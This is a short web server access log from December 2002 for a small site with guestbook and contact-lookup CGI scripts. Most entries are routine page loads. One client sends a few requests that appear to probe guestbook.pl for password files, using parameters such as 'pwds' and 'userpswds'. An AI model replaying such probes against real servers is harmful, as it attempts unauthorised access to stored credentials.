128.111.43.72 - - [06/Dec/2002:13:28:48 -0800] "GET /*.pl HTTP/1.1" 404 276 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:28:53 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:29:24 -0800] "GET /cgi-bin/guestbook.pl HTTP/1.1" 200 348 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:29:42 -0800] "GET /cgi-bin/guestbook.pl?pwds HTTP/1.1" 200 348 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:29:57 -0800] "GET /cgi-bin/guestbook.pl?userpswds HTTP/1.1" 200 348 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:30:10 -0800] "GET /cgi-bin/guestbook.pl HTTP/1.1" 200 348 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:13:34:49 -0800] "GET /contact.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:13:35:12 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:13:35:16 -0800] "GET /history.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:13:35:16 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/history.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:13:35:16 -0800] "GET /basstard_title.png HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.58 - - [06/Dec/2002:13:35:38 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:35:42 -0800] "GET /cgi-bin/query_extension.pl?cboname=golnaz HTTP/1.0" 200 313 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:35:44 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:35:45 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:35:47 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:35:52 -0800] "GET /cgi-bin/query_extension.pl?cboname=leanardo HTTP/1.0" 200 317 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:36:00 -0800] "GET /cgi-bin/query_extension.pl?cboname=le HTTP/1.0" 200 305 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:36:06 -0800] "GET /cgi-bin/query_extension.pl?cboname=leanardo HTTP/1.0" 200 317 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:36:06 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:36:07 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.72 - - [06/Dec/2002:13:38:27 -0800] "GET /contact.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:38:27 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
